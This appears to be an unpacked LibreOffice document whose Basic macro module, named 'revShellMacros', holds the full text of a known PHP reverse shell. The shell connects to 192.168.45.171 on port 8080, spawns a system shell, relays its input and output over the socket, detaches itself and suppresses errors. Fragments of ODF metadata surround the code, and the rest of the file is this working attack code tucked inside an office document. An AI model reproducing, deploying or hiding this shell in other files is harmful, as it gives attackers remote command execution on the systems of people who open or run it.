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revShell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revShellMacros.__construct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dc51" officeooo:paragraph-rsid="000edc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1:43:06.597000000</meta:creation-date>
    <meta:generator>LibreOffice/24.8.4.2$Windows_X86_64 LibreOffice_project/bb3cfa12c7b1bf994ecc5649a80400d06cd71002</meta:generator>
    <dc:date>2025-02-05T01:47:18.169000000</dc:date>
    <meta:editing-duration>PT4M11S</meta:editing-duration>
    <meta:editing-cycles>2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

<file path=Basic/Standard/revShellMacros.xml><?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE module  PUBLIC '-//OpenOffice.org//DTD OfficeDocument 1.0//EN'  'module.dtd'>
<script:module xmlns:script="http://openoffice.org/2000/script" script:name="revShellMacros" script:language="StarBasic" script:moduleType="normal">&lt;?php
// Copyright (c) 2020 Ivan Sincek
// v2.3
// Requires PHP v5.0.0 or greater.
// Works on Linux OS, macOS, and Windows OS.
// See the original script at https://github.com/pentestmonkey/php-reverse-shell.
class Shell {
    private $addr  = null;
    private $port  = null;
    private $os    = null;
    private $shell = null;
    private $descriptorspec = array(
        0 =&gt; array('pipe', 'r'), // shell can read from STDIN
        1 =&gt; array('pipe', 'w'), // shell can write to STDOUT
        2 =&gt; array('pipe', 'w')  // shell can write to STDERR
    );
    private $buffer  = 1024;    // read/write buffer size
    private $clen    = 0;       // command length
    private $error   = false;   // stream read/write error
    public function __construct($addr, $port) {
        $this-&gt;addr = $addr;
        $this-&gt;port = $port;
    }
    private function detect() {
        $detected = true;
        if (stripos(PHP_OS, 'LINUX') !== false) { // same for macOS
            $this-&gt;os    = 'LINUX';
            $this-&gt;shell = 'cmd';
        } else if (stripos(PHP_OS, 'WIN32') !== false || stripos(PHP_OS, 'WINNT') !== false || stripos(PHP_OS, 'WINDOWS') !== false) {
            $this-&gt;os    = 'WINDOWS';
            $this-&gt;shell = 'cmd.exe';
        } else {
            $detected = false;
            echo "SYS_ERROR: Underlying operating system is not supported, script will now exit...\n";
        }
        return $detected;
    }
    private function daemonize() {
        $exit = false;
        if (!function_exists('pcntl_fork')) {
            echo "DAEMONIZE: pcntl_fork() does not exists, moving on...\n";
        } else if (($pid = @pcntl_fork()) &lt; 0) {
            echo "DAEMONIZE: Cannot fork off the parent process, moving on...\n";
        } else if ($pid &gt; 0) {
            $exit = true;
            echo "DAEMONIZE: Child process forked off successfully, parent process will now exit...\n";
        } else if (posix_setsid() &lt; 0) {
            // once daemonized you will actually no longer see the script's dump
            echo "DAEMONIZE: Forked off the parent process but cannot set a new SID, moving on as an orphan...\n";
        } else {
            echo "DAEMONIZE: Completed successfully!\n";
        }
        return $exit;
    }
    private function settings() {
        @error_reporting(0);
        @set_time_limit(0); // do not impose the script execution time limit
        @umask(0); // set the file/directory permissions - 666 for files and 777 for directories
    }
    private function dump($data) {
        $data = str_replace('&lt;', '&amp;lt;', $data);
        $data = str_replace('&gt;', '&amp;gt;', $data);
        echo $data;
    }
    private function read($stream, $name, $buffer) {
        if (($data = @fread($stream, $buffer)) === false) { // suppress an error when reading from a closed blocking stream
            $this-&gt;error = true;                            // set global error flag
            echo "STRM_ERROR: Cannot read from ${name}, script will now exit...\n";
        }
        return $data;
    }
    private function write($stream, $name, $data) {
        if (($bytes = @fwrite($stream, $data)) === false) { // suppress an error when writing to a closed blocking stream
            $this-&gt;error = true;                            // set global error flag
            echo "STRM_ERROR: Cannot write to ${name}, script will now exit...\n";
        }
        return $bytes;
    }
    // read/write method for non-blocking streams
    private function rw($input, $output, $iname, $oname) {
        while (($data = $this-&gt;read($input, $iname, $this-&gt;buffer)) &amp;&amp; $this-&gt;write($output, $oname, $data)) {
            if ($this-&gt;os === 'WINDOWS' &amp;&amp; $oname === 'STDIN') { $this-&gt;clen += strlen($data); } // calculate the command length
            $this-&gt;dump($data); // script's dump
        }
    }
    // read/write method for blocking streams (e.g. for STDOUT and STDERR on Windows OS)
    // we must read the exact byte length from a stream and not a single byte more
    private function brw($input, $output, $iname, $oname) {
        $fstat = fstat($input);
        $size = $fstat['size'];
        if ($this-&gt;os === 'WINDOWS' &amp;&amp; $iname === 'STDOUT' &amp;&amp; $this-&gt;clen) {
            // for some reason Windows OS pipes STDIN into STDOUT
            // we do not like that
            // we need to discard the data from the stream
            while ($this-&gt;clen &gt; 0 &amp;&amp; ($bytes = $this-&gt;clen &gt;= $this-&gt;buffer ? $this-&gt;buffer : $this-&gt;clen) &amp;&amp; $this-&gt;read($input, $iname, $bytes)) {
                $this-&gt;clen -= $bytes;
                $size -= $bytes;
            }
        }
        while ($size &gt; 0 &amp;&amp; ($bytes = $size &gt;= $this-&gt;buffer ? $this-&gt;buffer : $size) &amp;&amp; ($data = $this-&gt;read($input, $iname, $bytes)) &amp;&amp; $this-&gt;write($output, $oname, $data)) {
            $size -= $bytes;
            $this-&gt;dump($data); // script's dump
        }
    }
    public function run() {
        if ($this-&gt;detect() &amp;&amp; !$this-&gt;daemonize()) {
            $this-&gt;settings();

            // ----- SOCKET BEGIN -----
            $socket = @fsockopen($this-&gt;addr, $this-&gt;port, $errno, $errstr, 30);
            if (!$socket) {
                echo "SOC_ERROR: {$errno}: {$errstr}\n";
            } else {
                stream_set_blocking($socket, false); // set the socket stream to non-blocking mode | returns 'true' on Windows OS

                // ----- SHELL BEGIN -----
                $process = @proc_open($this-&gt;shell, $this-&gt;descriptorspec, $pipes, null, null);
                if (!$process) {
                    echo "PROC_ERROR: Cannot start the shell\n";
                } else {
                    foreach ($pipes as $pipe) {
                        stream_set_blocking($pipe, false); // set the shell streams to non-blocking mode | returns 'false' on Windows OS
                    }

                    // ----- WORK BEGIN -----
                    $status = proc_get_status($process);
                    @fwrite($socket, "SOCKET: Shell has connected! PID: " . $status['pid'] . "\n");
                    do {
						$status = proc_get_status($process);
                        if (feof($socket)) { // check for end-of-file on SOCKET
                            echo "SOC_ERROR: Shell connection has been terminated\n"; break;
                        } else if (feof($pipes[1]) || !$status['running']) {                 // check for end-of-file on STDOUT or if process is still running
                            echo "PROC_ERROR: Shell process has been terminated\n";   break; // feof() does not work with blocking streams
                        }                                                                    // use proc_get_status() instead
                        $streams = array(
                            'read'   =&gt; array($socket, $pipes[1], $pipes[2]), // SOCKET | STDOUT | STDERR
                            'write'  =&gt; null,
                            'except' =&gt; null
                        );
                        $num_changed_streams = @stream_select($streams['read'], $streams['write'], $streams['except'], 0); // wait for stream changes | will not wait on Windows OS
                        if ($num_changed_streams === false) {
                            echo "STRM_ERROR: stream_select() failed\n"; break;
                        } else if ($num_changed_streams &gt; 0) {
                            if ($this-&gt;os === 'LINUX') {
                                if (in_array($socket  , $streams['read'])) { $this-&gt;rw($socket  , $pipes[0], 'SOCKET', 'STDIN' ); } // read from SOCKET and write to STDIN
                                if (in_array($pipes[2], $streams['read'])) { $this-&gt;rw($pipes[2], $socket  , 'STDERR', 'SOCKET'); } // read from STDERR and write to SOCKET
                                if (in_array($pipes[1], $streams['read'])) { $this-&gt;rw($pipes[1], $socket  , 'STDOUT', 'SOCKET'); } // read from STDOUT and write to SOCKET
                            } else if ($this-&gt;os === 'WINDOWS') {
                                // order is important
                                if (in_array($socket, $streams['read'])/*------*/) { $this-&gt;rw ($socket  , $pipes[0], 'SOCKET', 'STDIN' ); } // read from SOCKET and write to STDIN
                                if (($fstat = fstat($pipes[2])) &amp;&amp; $fstat['size']) { $this-&gt;brw($pipes[2], $socket  , 'STDERR', 'SOCKET'); } // read from STDERR and write to SOCKET
                                if (($fstat = fstat($pipes[1])) &amp;&amp; $fstat['size']) { $this-&gt;brw($pipes[1], $socket  , 'STDOUT', 'SOCKET'); } // read from STDOUT and write to SOCKET
                            }
                        }
                    } while (!$this-&gt;error);
                    // ------ WORK END ------

                    foreach ($pipes as $pipe) {
                        fclose($pipe);
                    }
                    proc_close($process);
                }
                // ------ SHELL END ------

                fclose($socket);
            }
            // ------ SOCKET END ------

        }
    }
}
echo '&lt;pre&gt;';
// change the host address and/or port number as necessary
$sh = new Shell('192.168.45.171', 8080);
$sh-&gt;run();
unset($sh);
// garbage collector requires PHP v5.3.0 or greater
// @gc_collect_cycles();
echo '&lt;/pre&gt;';
?&gt;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evShell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